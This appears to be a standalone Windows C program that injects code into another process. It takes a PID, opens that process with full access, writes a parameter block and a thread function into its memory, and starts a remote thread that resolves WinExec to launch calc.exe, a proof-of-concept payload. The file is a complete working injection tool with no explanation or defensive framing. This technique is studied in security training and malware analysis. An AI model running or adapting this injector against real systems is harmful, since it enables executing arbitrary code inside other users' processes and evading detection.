#include <stdio.h>
#include <Windows.h>
#include <string.h>
#include <tchar.h>

typedef struct _THREAD_PARAM {
    FARPROC pFunc[2];
    char pStr[3][100];
}THREAD_PARAM, * PTHREAD_PARAM;

typedef HMODULE(WINAPI* PFLoadLibraryA)(LPCSTR lpLibFileName);
typedef FARPROC(WINAPI* PFGetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
typedef UINT(WINAPI* PFWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

DWORD ThreadProc(LPVOID pParam) {
    PTHREAD_PARAM param = (PTHREAD_PARAM)pParam;
    HMODULE hMod = NULL;
    PFWinExec pFunc = NULL;

    hMod = ((PFLoadLibraryA)param->pFunc[0])(param->pStr[0]);
    pFunc = (PFWinExec)((PFGetProcAddress)param->pFunc[1])(hMod, param->pStr[1]);
    pFunc(param->pStr[2], 0); return 0;
}

BOOL CodeInjection(DWORD dwPID) {
    THREAD_PARAM param = { 0, };
    DWORD dwSize;
    HMODULE hMod = GetModuleHandleA("kernel32.dll");
    LPVOID pRemoteBuf[2] = { 0, };

    if (hMod) {
        param.pFunc[0] = GetProcAddress(hMod, "LoadLibraryA");
        param.pFunc[1] = GetProcAddress(hMod, "GetProcAddress");

        strcpy_s(param.pStr[0], 100, "kernel32.dll");
        strcpy_s(param.pStr[1], 100, "WinExec");
        strcpy_s(param.pStr[2], 100, "calc.exe");

        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);

        dwSize = sizeof(THREAD_PARAM);
        pRemoteBuf[0] = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
        if (pRemoteBuf[0]) {
            printf("[*] Data Size Allocated!\n");
            WriteProcessMemory(hProcess, pRemoteBuf[0], (LPCVOID)&param, dwSize, NULL);
            dwSize = (DWORD)CodeInjection - (DWORD)ThreadProc;
            printf("[*] Data was written in Memory!\n");

            pRemoteBuf[1] = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            if (pRemoteBuf[1]) {
                printf("[*] Code Size Allocated!\n");
                WriteProcessMemory(hProcess, pRemoteBuf[1], (LPCVOID)ThreadProc, dwSize, NULL);

                printf("[*] Code was written in Memory!\n");

                HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuf[1], pRemoteBuf[0], 0, NULL);
                if (hThread) {
                    printf("[*] Injected!\n");
                    WaitForSingleObject(hThread, INFINITE);
                    CloseHandle(hThread);
                    CloseHandle(hProcess);

                    return TRUE;
                }
                else {
                    printf("[-] CreateRemoteThread() Error!\n");
                }
            }
            else {
                printf("[-] Writing Data Failed!\n");
            }
        }
        else {
            printf("[-] Data Size Allocation Failed!\n");
        }
    }
    return FALSE;
}

int main(int argc, char* argv[]) {
    DWORD dwPID = 0;

    if (argc != 2) {
        printf(" Usage : %s [ PID ]\n", argv[0]); 
        return -1;
    }
    dwPID = (DWORD)atol(argv[1]);
    CodeInjection(dwPID);

    return 0;
}
